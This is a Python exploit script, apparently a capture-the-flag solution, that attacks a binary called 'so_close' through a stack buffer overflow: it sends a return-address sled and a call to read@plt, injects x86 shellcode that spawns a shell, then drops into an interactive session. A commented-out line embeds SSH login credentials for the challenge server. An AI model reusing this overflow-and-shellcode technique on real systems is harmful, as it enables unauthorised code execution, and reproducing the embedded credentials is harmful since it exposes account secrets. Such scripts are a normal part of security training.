#!/usr/bin/env python
from sc_pwn import *

#target     = {'host':'192.168.75.133','port':8080}
#target     = {'host':'shell.icec.tf','port':22,'username':'ctf-30384','password':'fZuJnE8a','program':'/home/so_close/so_close'}
target     = {'program':'./so_close'}

addr_buf        = 0x08049000

addr_plt_read   = 0x080482f0
addr_ret        = 0x080482ba

#==========
def attack(cmn):
    cmn.set_show('HEXDUMP')

    sc = ShellCode('x86')

    exploit  = pack_32(addr_ret) * (0xf8/4)
    exploit += pack_32(addr_plt_read)
    exploit += pack_32(addr_buf)
    exploit += pack_32(STDIN_FILENO)
    exploit += pack_32(addr_buf)
    exploit += pack_32(0x100)
    exploit += '\x00'

    cmn.read_until('something..')
    cmn.send(exploit)
    sleep(0.5)
    raw_input('>>')
    
    cmn.send(sc.sh())

#==========

if __name__=='__main__':
    #cmn = Communicate(target,mode='SOCKET')
    #cmn = Communicate(target, mode='SSH', ASLR=False)
    cmn = Communicate(target, mode='LOCAL', ASLR=False, wait=True)
    attack(cmn)

    """
    sh = Shell(cmn)
    sh.select()
    del(sh)
    """
    cmn.set_show()
    Interact(cmn).worker(False)
    
    del(cmn)
    
#==========
